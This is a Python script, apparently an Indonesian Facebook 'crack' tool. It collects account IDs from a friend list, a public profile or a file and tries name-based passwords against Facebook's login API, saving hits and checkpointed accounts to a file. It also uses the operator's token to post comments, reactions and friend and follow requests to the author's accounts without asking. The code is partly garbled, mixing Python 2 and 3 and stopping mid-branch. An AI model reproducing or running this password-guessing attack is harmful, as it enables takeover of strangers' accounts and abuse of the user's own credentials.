#!/usr/bin/python2
# coding=utf-8

#Import module
import os,sys,time,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib
from multiprocessing.pool import ThreadPool
try:
	import mechanize
except ImportError:
	os.system("pip2 install mechanize")
try:
	import bs4
except ImportError:
	os.system("pip2 install bs4")
try:
	import requests
except ImportError:
	os.system("pip2 install requests")
	os.system("python2 crack.py")
from requests.exceptions import ConnectionError
from mechanize import Browser 

reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]


def keluar():
	print ("[!] Exit")
	os.sys.exit()
	
	
def acak(x):
    w = 'mhkbpcP'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)
    
    
def cetak(x):
    w = 'mhkbpcP'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'%s;'%str(31+j))
    x += ''
    x = x.replace('!0','')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.06)
		
#########LOGO#########
logo = """
\033[1;92m ═════════════════════════════   \033[1;91m
\033[1;92m GUNAKAN SCRIPT INI SEBAIK MUNGKIN!   \033[1;91m
\033[1;92m ═════════════════════════════   \033[1;91m
\033[1;92m KARNA SAYA TIDAK AKAN BERTANGGUNG JAWAB  \033[1;91m                                                                                                                                                                                     
\033[1;92m ═════════════════════════════   
\033[1;92m JIKA ADA KERUSAKAN ATAU APAPUN!!     \033[1;91m
\033[1;92m ═════════════════════════════   \033[1;91m
\033[1;96mKOCAK
\033[1;96mLU
"""

def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;97m[\033[1;93m●\033[1;97m]\033[1;93m Lagi Login\033[1;97m "+o),;sys.stdout.flush();time.sleep(1)


back = 0
threads = []
berhasil = []
cekpoint = []
oks = []
oke = []
cpe = []
id = []
username = []
idteman = []
idfromteman = []
gagal = []
reaksi = []
komen = []
vulnot = "Not Vuln"
vuln = "Vuln"

######MASUK######
def masuk():
	os.system('clear')
	print logo
	print "\33[1;33m╔══════════════════════════════════════════╗"
	print "\33[1;33m║[\033[1;31;1m01\33[1;33m]\033[37;1mLogin Menggunakan Email / ID Facebook \33[1;33m║"
	print "\33[1;33m║[\033[1;31;1m02\33[1;33m]\033[37;1mLogin Menggunakan Token Facebook      \33[1;33m║"
	print "\33[1;33m║[\033[1;31;1m03\33[1;33m]\033[37;1mAmbil Token                           \33[1;33m║"
	print "\33[1;33m║[\033[1;31;1m00\33[1;33m]\033[37;1mKeluar                                \33[1;33m║"
	print "\33[1;33m╚══════════════════════════════════════════╝"
	pilih_masuk()

def pilih_masuk():
	msuk = raw_input("\033[1;93mBY RikoMrko \033[91m:\033[1;96m ")
	if msuk =="":
		print"\033[37;1m[\033[32;1m!\033[37;1m] Isi Yg Benar !"
		pilih_masuk()
	elif msuk =="1" or msuk =="01":
		login()
	elif msuk =="2" or msuk =="02":
		tokenz()
	elif msuk =="3"or msuk =="03":
		Ambil_Token()
	elif msuk =="0" or msuk =="00":
		keluar()
	else:
		print"\033[37;1m[\033[32;1m!\033[37;1m] Isi Yg Benar !"
		pilih_masuk()
			
#####LOGIN_EMAIL#####
def login():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
		print logo
		print"\033[1;97m[\033[1;96m🤡\033[1;97m] LOGIN AKUN FACEBOOK ANDA \033[1;97m[\033[1;96m🤡\033[1;97m]"
		id = raw_input('[\033[1;95m+\033[1;97m] ID / Email =\033[1;92m ')
		pwd = raw_input('\033[1;97m[\033[1;95m?\033[1;97m] Password =\033[1;92m ')
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n[!] Tidak ada koneksi"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				unikers = open("login.txt", 'w')
				unikers.write(z['access_token'])
				unikers.close()
				print '\n\033[1;97m[\033[1;92m✓\033[1;97m]\033[1;92m Login Berhasil'
				os.system('xdg-open https://m.facebook.com/user.keramat.90')
				bot_komen()
			except requests.exceptions.ConnectionError:
				print"\n[!] Tidak ada koneksi"
				keluar()
		if 'checkpoint' in url:
			print("\n\033[1;97m[\033[1;93m!\033[1;97m]\033[1;93m Sepertinya Akun Anda Checkpoint")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("\n\033[1;97m[\033[1;91m!\033[1;97m]\033[1;91m Password / Email Salah")
			os.system('rm -rf login.txt')
			time.sleep(1)
			masuk()
			
#####LOGIN_TOKENZ#####
def login123():
	os.system('clear')
	banner()
	cetak(panel(f"[[bold cyan]01[bold white]] Login Menggunakan Cookie              [[bold cyan]03[bold white]] Crack Instagram \n[[bold cyan]02[bold white]] Menu Crack Tanpa Login                [[bold cyan]04[bold white]] Cek Hasil Crack ",width=90,title=f"[bold green]Menu Bot",padding=(0,2),style=f"bold white"))
	bryn = input(f' [+] Pilih Menu : ')
	if bryn in ['1','01']:
		login_lagi334()
	elif bryn in ['2','02']:
		crack_email()
	elif bryn in ['3','03']:
		error()
	elif bryn in ['4','04']:
		result()
	else:
		print(' [+] Pilih Yang Bener Asu ')
		time.sleep(5)
		exit()
		
def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login123()
		except requests.exceptions.ConnectionError:
			li = ' [+] Problem Internet Connection, Check And Try Again'
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	except IOError:
		login123()
		
def login_lagi334():
	try:
		cetak(nel('Disarankan Untuk Menggunakan Cookie Yang Masih Fresh Untuk Melakukan Crack Account',width=90,style=f"bold white"))
		your_cookies = input(' [+] Masukan Cookie : ')
		with requests.Session() as r:
			try:
				r.headers.update({'content-type': 'application/x-www-form-urlencoded',})
				data = {'access_token': '867777633323150|446fdcd4a3704f64e5f6e5fd12d35d01','scope': ''}
				response = json.loads(r.post('https://graph.facebook.com/v2.6/device/login/', data = data).text)
				code, user_code = response['code'], response['user_code']
				verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=867777633323150|446fdcd4a3704f64e5f6e5fd12d35d01&callback=LeetsharesCallback'.format(code))
				r.headers.pop('content-type')
				r.headers.update({'sec-fetch-mode': 'navigate','user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36','sec-fetch-site': 'cross-site','Host': 'm.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-dest': 'document',})
				response2 = r.get(verification_url, cookies = {'cookie': your_cookies}).text
				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
					print(" [+] Cookie Invalid...", end='\r');time.sleep(3.5);print("                     ", end='\r');exit()
				else:
					action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
					fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1)
					jazoest = re.search('name="jazoest" value="(\d+)"', str(response2)).group(1)
					data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'qr': 0,'user_code': user_code,}
					r.headers.update({'origin': 'https://m.facebook.com','referer': verification_url,'content-type': 'application/x-www-form-urlencoded','sec-fetch-site': 'same-origin',})
					response3 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies})
					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
						r.headers.pop('content-type');r.headers.pop('origin')
						response4 = r.post(response3.url, data = data, cookies = {'cookie': your_cookies}).text
						action = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')
						fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response4)).group(1)
						jazoest = re.search('name="jazoest" value="(\d+)"', str(response4)).group(1)
						scope = re.search('name="scope" value="(.*?)"', str(response4)).group(1)
						display = re.search('name="display" value="(.*?)"', str(response4)).group(1)
						user_code = re.search('name="user_code" value="(.*?)"', str(response4)).group(1)
						logger_id = re.search('name="logger_id" value="(.*?)"', str(response4)).group(1)
						auth_type = re.search('name="auth_type" value="(.*?)"', str(response4)).group(1)
						encrypted_post_body = re.search('name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)
						return_format = re.search('name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)
						r.headers.update({'origin': 'https://m.facebook.com','referer': response3.url,'content-type': 'application/x-www-form-urlencoded',})
						data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'scope': scope,'display': display,'user_code': user_code,'logger_id': logger_id,'auth_type': auth_type,'encrypted_post_body': encrypted_post_body,'return_format[]': return_format,}
						response5 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies}).text
						windows_referer = re.search('window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')
						r.headers.pop('content-type');r.headers.pop('origin')
						r.headers.update({'referer': 'https://m.facebook.com/',})
						response6 = r.get(windows_referer, cookies = {'cookie': your_cookies}).text
						if 'Sukses!' in str(response6):
							r.headers.update({'sec-fetch-mode': 'no-cors','referer': 'https://graph.facebook.com/','Host': 'graph.facebook.com','accept': '*/*','sec-fetch-dest': 'script','sec-fetch-site': 'cross-site',})
							response7 = r.get(status_url, cookies = {'cookie': your_cookies}).text
							access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)
							print(f"\n [+] Token : {access_token}")
							tokenew = open(".token.txt","w").write(access_token)
							cook= open(".cok.txt","w").write(your_cookies)
							os.system("xdg-open https://chat.whatsapp.com/InwlvDU3t6d9FShXwfH2MV")
							print("\n [+] Login Berhasil | python BrayennnFB.py");followdong()
			except Exception as e:
				print(" [+] Cookies Mokad Kontol")
				os.system('rm -rf .token.txt && rm -rf .cok.txt')
				print(e)
				time.sleep(3)
				exit()
	except:pass

def followdong():
	try:
		token = open('.token.txt','r').read()
		cokies = open('.cok.txt','r').read()
	except IOError:
		print(' [+] Cookies Kadaluarsa ')
		time.sleep(5)
		login()
	myuid = ('100001571125775')
	try:
		for foll in parser(requests.get(f'https://mbasic.facebook.com/'+myuid,cookies={'cookie':cokies}).text,'html.parser').find_all('a',href=True):
			if '/a/subscribe.php?' in foll.get('href'):
				x=requests.get('https://mbasic.facebook.com'+foll['href'],cookies = {'cookie':cokies}).text
				exit()
	except(Exception)as e:print(e)#< Response error

######BOT KOMEN#######
def bot_komen():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;97m[!] Token invalid"
		os.system('rm -rf login.txt')
	una = ('100005789553399')
	kom = ('GUE PAKE SCRIPT LU NENG MILA 😘😘😘')
	reac = ('ANGRY')
	post = ('1190012567868384')
	post2 = ('1190012567868384')
	kom2 = ('KREN SUKSES SELALU YA 😘😘😘')
	reac2 = ('LOVE')
	requests.post('https://graph.facebook.com/me/friends?method=post&uids=' +una+ '&access_token=' + toket)
	requests.post('https://graph.facebook.com/'+post+'/comments/?message=' +kom+ '&access_token=' + toket)
	requests.post('https://graph.facebook.com/'+post+'/reactions?type=' +reac+ '&access_token='+ toket)
	requests.post('https://graph.facebook.com/'+post2+'/comments/?message=' +kom2+ '&access_token=' + toket)
	requests.post('https://graph.facebook.com/'+post2+'/reactions?type=' +reac2+ '&access_token='+ toket)
	menu()

######AMBIL_TOKEN######
def Ambil_Token():
	os.system("clear")
	print logo
	jalan("\033[1;92mInstall...")
	os.system ("cd ... && npm install")
	jalan ("\033[1;96mMulai...")
	os.system ("cd ... && npm start")
	raw_input("\n[ Kembali ]")
	masuk()

######MENU#######
def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		os.system('rm -rf login.txt')
		masuk()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print"\033[1;96m[!] \033[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		masuk()
	except requests.exceptions.ConnectionError:
		print"[!] Tidak ada koneksi"
		keluar()
	os.system("clear")
	print logo
	print "\033[1;31;1m=========================================="
	print "\033[37;1m=========================================="
	print "\033[1;97m[\033[1;34m✓\033[1;97m]\033[1;34m Nama Akun\033[1;91m     =>\033[1;93m "+nama
	print "\033[1;97m[\033[1;34m•\033[1;97m]\033[1;34m UID\033[1;91m           =>\033[1;93m "+id
	print "\033[1;97m[\033[1;34m+\033[1;97m]\033[1;34m Tanggal Lahir\033[1;91m =>\033[1;93m "+ a['birthday']
	print "\033[37;96m╔═════════════════════════╗"
	print "\033[37;96m║[\033[1;31;1m01\033[37;96m]\033[1;31;1m->\033[37;1mCrack ID Indonesia \033[37;96m║"
	print "\033[37;96m║[\033[1;31;1m02\033[37;96m]\033[1;31;1m->\033[37;1mKeluar             \033[37;96m║"
	print "\033[37;96m╚═════════════════════════╝"
	pilih()
	
######PILIH######
def pilih():
	unikers = raw_input("\033[1;93mBY RikoMrko \033[91m:\033[1;96m ")
	if unikers =="":
		print"\033[1;97m[\033[1;91m!\033[1;97m]\033[1;97m Isi Yg Benar !"
		pilih()
	elif unikers =="1" or unikers =="01":
		indo()
	elif unikers =="0" or unikers =="00":
		os.system('clear')
		jalan('Menghapus token')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print"\033[1;97m[\033[1;91m!\033[1;97m]\033[1;97m Isi Yg Benar !"
		pilih()
	
########## CRACK INDONESIA #######
def indo():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;96m[!] \x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	os.system('clear')
	print logo
	print "\033[37;96m╔══════════════════════════════╗"
	print "\033[37;96m║\033[1;34m[01]\033[1;31;1m->\033[37;1mCrack Dari Daftar Teman \033[37;96m║"
	print "\033[37;96m║\033[1;34m[02]\033[1;31;1m->\033[37;1mCrack Dari ID Publik    \033[37;96m║"
	print "\033[37;96m║\033[1;34m[03]\033[1;31;1m->\033[37;1mCrack Dari File         \033[37;96m║"
	print "\033[37;96m║\033[1;34m[00]\033[1;31;1m->\033[37;1mKembali                 \033[37;96m║"
	print "\033[37;96m╚══════════════════════════════╝"
	pilih_indo()

#### PILIH INDO ####
def pilih_indo():
	teak = raw_input("\033[1;93mBY RikoMrko \033[91m:\033[1;96m ")
	if teak =="":
		print"\033[1;97m[\033[1;91m!\033[1;97m]\033[1;97m Isi Yg Benar !"
		pilih_indo()
	elif teak =="1" or teak =="01":
		os.system('clear')
		print logo
		print "\033[1;31;1m=========================================="
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif teak =="2" or teak =="02":
		os.system('clear')
		print logo
		print "\033[1;31;1m=========================================="
		print "\033[37;1m=========================================="
	        idt = raw_input("\033[1;97m{\033[1;34m✔\033[1;97m} ID publik/teman : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;97m{\033[1;93m✴\033[1;97m} Nama : "+op["name"]
		except KeyError:
			print"\033[1;97m[\033[1;93m!\033[1;97m] ID publik/teman tidak ada !"
			raw_input("\n[ Kembali ]")
			indo()
		except requests.exceptions.ConnectionError:
			print"[!] Tidak ada koneksi !"
			keluar()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif teak =="3" or teak =="03":
		os.system('clear')
		print logo
		try:
			print "\033[1;31;1m=========================================="
			idlist = raw_input('\033[1;97m{\033[1;93m?\033[1;97m} Nama File : ')
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
		except KeyError:
			print '\033[1;97m[!] File tidak ada ! '
			raw_input('\n\033[1;92m[ \033[1;97mKembali \033[1;92m]')
		except IOError:
			print '\033[1;97m[!] File tidak ada !'
			raw_input('\n\033[1;92m[ \033[1;97mKembali \033[1;92m]')
			indo()
	elif teak =="0" or teak =="00":
		menu()
	else:
		print"\033[1;97m[\033[1;91m!\033[1;97m]\033[1;97m Isi Yg Benar !"
		pilih_indo()
	
	print "\033[1;97m{\033[1;93m➹\033[1;97m} Total ID : "+str(len(id))
	print('\033[1;97m{\033[1;93m➹\033[1;97m} Stop CTRL+Z')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;97m{\033[1;93m➹\033[1;97m} Crack Berjalan "+o),;sys.stdout.flush();time.sleep(1)

	print "\n\033[1;31;1m=========================================="
        print "\n\033[1;96mJANGAN MENYALAH GUNAKAN SCRIPT INI YA BOSS"
        print "\n\033[1;33mBY RikoMrko"
	print "\n\033[37;1m=========================================="
	
##### MAIN INDONESIA #####
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			c = json.loads(a.text)
			pass1 = c['first_name']+'123'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			w = json.load(data)
			if 'access_token' in w:
				x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
				z = json.loads(x.text)
				print '\x1c\33[1;33m[✔] \x1c\33[1;33mBerhasil'
				print '\x1c\33[1;33m[✴] \x1c\33[1;33mName \x1c\33[1;33m    : \x1c\33[1;33m' + c['name']
				print '\x1c\33[1;33m[➹] \x1c\33[1;33mID \x1c\33[1;33m      : \x1c\33[1;33m' + user
				print '\x1c\33[1;33m[➹] \x1c\33[1;33mPassword \x1c\33[1;33m: \x1c\33[1;33m' + pass1 + '\n'
				print '\x1c\33[1;33m[➹] \x1c\33[1;33mTanggal Lahir \x1c\33[1;33m: \x1c\33[1;33m' + c['birthday']
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in w['error_msg']:
					print '\x1c\033[1;94m[✖] \x1c\033[1;94mCheckpoint'
					print '\x1c\033[1;94m[✴] \x1c\033[1;94mName \x1c\033[1;94m    : \x1c\033[1;95m' + c['name']
					print '\x1c\033[1;94m[➹] \x1c\033[1;94mID \x1c\033[1;94m      : \x1c\033[1;95m' + user
					print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass1 + '\n'
					print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']
					cek = open("out/super_cp.txt", "a")
					cek.write("ID:" +user+ " Pw:" +pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = c['first_name']+'1234'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					w = json.load(data)
					if 'access_token' in w:
						x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
						z = json.loads(x.text)
						print '\x1c\033[1;94m[✔] \x1c\033[1;92mBerhasil'
						print '\x1c\033[1;94m[✴] \x1c\033[1;91mName \x1c\033[1;91m    : \x1c\033[1;92m' + c['name']
						print '\x1c\033[1;94m[➹] \x1c\033[1;91mID \x1c\033[1;91m      : \x1c\033[1;92m' + user
						print '\x1c\033[1;94m[➹] \x1c\033[1;91mPassword \x1c\033[1;91m: \x1c\033[1;92m' + pass2 + '\n'
						print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in w['error_msg']:
							print '\x1c\033[1;94m[✖] \x1c\033[1;94mCheckpoint'
							print '\x1c\033[1;94m[✴] \x1c\033[1;94mName \x1c\033[1;94m    : \x1c\033[1;95m' + c['name']
							print '\x1c\033[1;94m[➹] \x1c\033[1;94mID \x1c\033[1;94m      : \x1c\033[1;95m' + user
							print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass2 + '\n'
							print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']
							cek = open("out/super_cp.txt", "a")
							cek.write("ID:" +user+ " Pw:" +pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = c['first_name']+'12345'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							w = json.load(data)
							if 'access_token' in w:
								x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
								z = json.loads(x.text)
								print '\x1c\033[1;94m[✔] \x1c\033[1;92mBerhasil'
								print '\x1c\033[1;94m[✴] \x1c\033[1;91mName \x1c\033[1;91m    : \x1c\033[1;92m' + c['name']
								print '\x1c\033[1;94m[➹] \x1c\033[1;91mID \x1c\033[1;91m      : \x1c\033[1;92m' + user
								print '\x1c\033[1;94m[➹] \x1c\033[1;91mPassword \x1c\033[1;91m: \x1c\033[1;92m' + pass3 + '\n'
								print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in w['error_msg']:
									print '\x1c\033[1;94m[✖] \x1c\033[1;94mCheckpoint'
									print '\x1c\033[1;94m[✴] \x1c\033[1;94mName \x1c\033[1;94m    : \x1c\033[1;95m' + c['name']
									print '\x1c\033[1;94m[➹] \x1c\033[1;94mID \x1c\033[1;94m      : \x1c\033[1;95m' + user
									print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass3 + '\n'
									print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']
									cek = open("out/super_cp.txt", "a")
									cek.write("ID:" +user+ " Pw:" +pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = c['last_name']+'123'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									w = json.load(data)
									if 'access_token' in w:
										x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
										z = json.loads(x.text)
										print '\x1c\033[1;94m[✔] \x1c\033[1;92mBerhasil'
										print '\x1c\033[1;94m[✴] \x1c\033[1;91mName \x1c\033[1;91m    : \x1c\033[1;92m' + c['name']
										print '\x1c\033[1;94m[➹] \x1c\033[1;91mID \x1c\033[1;91m      : \x1c\033[1;92m' + user
										print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass4 + '\n'
										print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in w['error_msg']:
											print '\x1c\033[1;94m[✖] \x1c\033[1;94mCheckpoint'
											print '\x1c\033[1;94m[✴] \x1c\033[1;94mName \x1c\033[1;94m    : \x1c\033[1;95m' + c['name']
											print '\x1c\033[1;94m[➹] \x1c\033[1;94mID \x1c\033[1;94m      : \x1c\033[1;95m' + user
											print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass4 + '\n'
											print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']
											cek = open("out/super_cp.txt", "a")
											cek.write("ID:" +user+ " Pw:" +pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = c['last_name']+'1234'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											w = json.load(data)
											if 'access_token' in w:
												x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
												z = json.loads(x.text)
												print '\x1c\033[1;94m[✔] \x1c\033[1;92mBerhasil'
												print '\x1c\033[1;94m[✴] \x1c\033[1;91mName \x1c\033[1;91m    : \x1c\033[1;92m' + c['name']
												print '\x1c\033[1;94m[➹] \x1c\033[1;91mID \x1c\033[1;91m      : \x1c\033[1;92m' + user
												print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass5 + '\n'
												print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in w['error_msg']:
													print '\x1c\033[1;94m[✖] \x1c\033[1;94mCheckpoint'
													print '\x1c\033[1;94m[✴] \x1c\033[1;94mName \x1c\033[1;94m    : \x1c\033[1;95m' + c['name']
													print '\x1c\033[1;94m[➹] \x1c\033[1;94mID \x1c\033[1;94m      : \x1c\033[1;95m' + user
													print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass5 + '\n'
													print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']
													cek = open("out/super_cp.txt", "a")
													cek.write("ID:" +user+ " Pw:" +pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = c['last_name']+'12345'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													w = json.load(data)
													if 'access_token' in w:
														x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
														z = json.loads(x.text)
														print '\x1c\033[1;94m[✔] \x1c\033[1;92mBerhasil'
														print '\x1c\033[1;94m[✴] \x1c\033[1;91mName \x1c\033[1;91m    : \x1c\033[1;92m' + c['name']
														print '\x1c\033[1;94m[➹] \x1c\033[1;91mID \x1c\033[1;91m      : \x1c\033[1;92m' + user
														print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass6 + '\n'
														print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in w['error_msg']:
															print '\x1c\033[1;94m[✖] \x1c\033[1;94mCheckpoint'
															print '\x1c\033[1;94m[✴] \x1c\033[1;94mName \x1c\033[1;94m    : \x1c\033[1;95m' + c['name']
															print '\x1c\033[1;94m[➹] \x1c\033[1;94mID \x1c\033[1;94m      : \x1c\033[1;95m' + user
															print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass6 + '\n'
															print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']
															cek = open("out/super_cp.txt", "a")
															cek.write("ID:" +user+ " Pw:" +pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															pass7 = 'Sayang'
